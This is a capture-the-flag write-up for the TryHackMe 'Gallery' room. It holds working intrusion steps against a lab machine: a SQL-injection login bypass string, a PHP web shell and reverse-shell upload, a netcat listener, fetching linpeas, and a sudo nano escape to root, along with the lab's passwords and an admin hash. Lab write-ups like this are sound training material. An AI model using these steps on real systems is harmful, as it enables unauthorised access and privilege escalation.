# Gallery


<img width="225" height="225" alt="c53a8eb73f24535345477fdf603fe1de" src="https://github.com/user-attachments/assets/fb790fe6-76ab-4799-a8ee-7ec32ed797fc" />



https://tryhackme.com/room/gallery666
---

This room has two flags to identify - the user and the root flag. There are also additional questions to be answered along the way!

Start the machine and scan the target IP address:

```shell
nmap 10.81.167.89 -sV -sC -T4 -n
```

SS1
<img width="818" height="739" alt="Screenshot 2025-12-28 214605" src="https://github.com/user-attachments/assets/dadaa356-41f9-43a0-ac7f-f08050a25d30" />

Port 22, 80, and 8080 are open.

Checking out port 80 and port 8080 on a web browser, I saw that on port 8080 (http://10.81.167.89/gallery/login.php), there is a login panel for Simple Image Gallery System.


SS2
<img width="1846" height="949" alt="Screenshot 2025-12-28 215007" src="https://github.com/user-attachments/assets/aca276fb-08e9-4541-83e6-a591b2b1e845" />

The name of the CMS is Simple Image Gallery. 

I searched for the CMS on exploit database and found: https://www.exploit-db.com/exploits/50214
Simple Image Gallery 1.0 - Remote Code Execution (RCE) (Unauthenticated)

I copied the exploit into a .py file using nano and entered the target url into the script.

SS3
<img width="808" height="756" alt="Screenshot 2025-12-28 220357" src="https://github.com/user-attachments/assets/bbc38a1d-1630-4fc1-9879-d6d50e0cc8e0" />

The exploit works by chaining three vulnerabilities to take control of the server. First, it uses SQLi to bypass the login screen and gain admin access. Then, it scrapes profile data of the user to maintain a valid session. Then it exploits an unrestricted file upload vulnerability. It uploads a malicious PHP script which is a web shell that is disguised as a profile picture. The server fails to validate the file as an image and it saves the PHP to a public folder. Then, the script identifies the location of the file which allows attackers to execute system commands remotely with URL parameters (ex: `?cmd=whoami`). 

Make the script executable:

`chmod +x siexploit.py 

and run,

`./siexploit.py`

The output provides a Shell Url: http://10.81.167.89/gallery/uploads/1766984880_TagotlylgrhcaoyhgnlLetta.php?cmd=whoami

the output oft he cmd=whoami is www-data

SS4
<img width="1853" height="948" alt="Screenshot 2025-12-28 220917" src="https://github.com/user-attachments/assets/edaf21eb-0ee3-4389-bb81-5b54a46e1779" />

This means commands can be executed via the url to display information on the webpage.

For example, the url: http://10.81.167.89/gallery/uploads/1766984880_TagotlylgrhcaoyhgnlLetta.php?cmd=ls

displays the output of the ls command:

```text
1766984880_TagotlylgrhcaoyhgnlLetta.php
gallery.png
no-image-available.png
user_1
```

SS5
<img width="988" height="429" alt="Screenshot 2025-12-28 221121" src="https://github.com/user-attachments/assets/91fae808-bae0-4054-80f1-3de9f0889790" />

This didn't help much though as it did not allow for commands to setup a true reverse shell.
I decided to take the SQLi from the exploit code and try it to login to the login page and it worked.

username = " admin' or '1'='1'# "
password = " "

(the password is a single space)

SS6
<img width="1848" height="952" alt="Screenshot 2025-12-28 221704" src="https://github.com/user-attachments/assets/6931f460-79b5-4446-9dee-c244dd064cea" />

Under the albums tab there is a button to add new which could be used to upload a PHP reverse shell.

SS7
<img width="1245" height="581" alt="Screenshot 2025-12-28 221757" src="https://github.com/user-attachments/assets/5c93c836-3dd4-47c7-a778-e8419de8c2bd" />

Navigate to /usr/share/webshells/php/ to get the reverse shell code in kali. 

Input my IP and port 4444

SS8
<img width="785" height="696" alt="Screenshot 2025-12-28 222133" src="https://github.com/user-attachments/assets/3c3de13a-1c69-4f40-931f-c20695d377c5" />

Setup a listener and upload the file.

```shell
rlwrap nc -nvlp 4444
```

SS9
<img width="625" height="102" alt="Screenshot 2025-12-28 222222" src="https://github.com/user-attachments/assets/9f2996fc-dfb4-4e30-9d51-400b8b93d8b1" />

SS10
<img width="1239" height="596" alt="Screenshot 2025-12-28 222524" src="https://github.com/user-attachments/assets/b8ed01a6-39b3-441b-a671-76fb1aefc8bc" />

The "image" successfully uploaded and then I had a shell.

SS11
<img width="745" height="230" alt="Screenshot 2025-12-28 222551" src="https://github.com/user-attachments/assets/1b63b87b-d671-490d-bf22-d88788f683cb" />

### Then I stabilized the reverse shell like so:


```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


`export TERM=xterm`

Background the shell on the attacker terminal with ctrl + Z. This suspends the netcat process and returns to a local terminal.


`stty raw -echo

enter a few times

`fg`


SS14
<img width="769" height="579" alt="Screenshot 2025-12-28 224134" src="https://github.com/user-attachments/assets/91d936fa-faf7-41cc-b822-f715bb6bc3de" />

Now that I had a clean shell, it was time to look for the user flag. There is also the question What's the hash password of the admin user? to keep in mind.

I ran

``find / -name user.txt 2>/dev/null``

but the user.txt has permission denied when trying to cat it out.

<img width="646" height="174" alt="Screenshot 2025-12-28 224422" src="https://github.com/user-attachments/assets/2b2438ba-e006-406b-b91c-95b8e169846d" />


It is time to escalate privs.

`cd /tmp`

start a python server on host machine:

`python -m http.server 8000

retrieve linpeas on the shell:

`wget http://192.168.182.54:8000/linpeas.sh`

Then I had linpeas downloaded on the shell.

SS15
<img width="734" height="375" alt="Screenshot 2025-12-28 225728" src="https://github.com/user-attachments/assets/cd08caf3-4241-4f98-9e1a-079dc0821664" />


chmod +x it

and execute it ./


linpeas found some vulnerabilities as shown:

SS16
<img width="992" height="715" alt="Screenshot 2025-12-28 230600" src="https://github.com/user-attachments/assets/61a33f7c-c851-48f6-96c6-43ecd0e95c4c" />

I tried a dirtypipe exploit but gcc was not installed on the target so I looked further down to see what linpeas had found.

Under "Searching passwords in history files"
it is apparent that there is a password displayed:

b3stpassw0rdbr0xx

<img width="988" height="138" alt="Screenshot 2025-12-28 231621" src="https://github.com/user-attachments/assets/65e6d013-c80a-427c-a3e8-6bbce165b006" />

This appears to be the user mike's password

Then I 

`su mike`

and pasted his password in.

SS17
<img width="563" height="201" alt="Screenshot 2025-12-28 231745" src="https://github.com/user-attachments/assets/123a1158-cc4e-47e2-b441-6bd4493725cf" />

I was then operating as user mike and could retrieve the user flag that I found the location of earlier. 

SS18
<img width="1019" height="144" alt="Screenshot 2025-12-28 231921" src="https://github.com/user-attachments/assets/79c95f59-d07f-48af-b496-d50c09e770d2" />

Cat out the user flag.

now, I did 

`sudo -l`

SS19
<img width="822" height="493" alt="Screenshot 2025-12-28 232149" src="https://github.com/user-attachments/assets/0b35ec16-da0d-47ae-9837-e665d5813538" />

/bin/bash /opt/rootkit.sh is interesting so I cat it out. 

Can also run sudo /bin/bash /opt/rootkit.sh

I could not find anything about a sudo exploit on rkhunter on GTFOBins, but I did find something for nano.

https://gtfobins.github.io/gtfobins/nano/#sudo

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

run 

`sudo /bin/bash /opt/rootkit.sh`

type read,

SS20
<img width="551" height="107" alt="Screenshot 2025-12-28 232910" src="https://github.com/user-attachments/assets/e4e03b27-c00e-45ae-addc-20741b43eaee" />

<img width="813" height="556" alt="Screenshot 2025-12-28 233843" src="https://github.com/user-attachments/assets/501e6f74-517e-4aa3-8925-ac4c6b777e3a" />


now `^R^X`

and paste the command

`reset; sh 1>&0 2>&0`

(AT THIS POINT THE MACHINE ON TRYHACKME REPEATED TO CRASH SO I HAD TO COMPLETE THE REST OF THE ROOM ON ANOTHER DAY... I HAVE NO FURTHER SCREENSHOTS FOR THE ROOM BECAUSE OF THIS REASON.)

.........

type `id`

no I am root,

cat /root/root.txt

to get the root flag.

---

Then I had to go back to answer the question:
What's the hash password of the admin user?

`cd /var/www/html/gallery/classes`

`cat DBConnection.php`

can see:

`require_once("../initialize.php");`

`cd /var/www/html/gallery/classes`

`cat initialize.php`

This gives the DB username: gallery_user and password: passw0rd321

`mysql`

```text
show databases;

use gallery_db;

show tables

select * from users;

```

This reveals the admin hash

a228b12a08b6527e7976cbe5d914531c
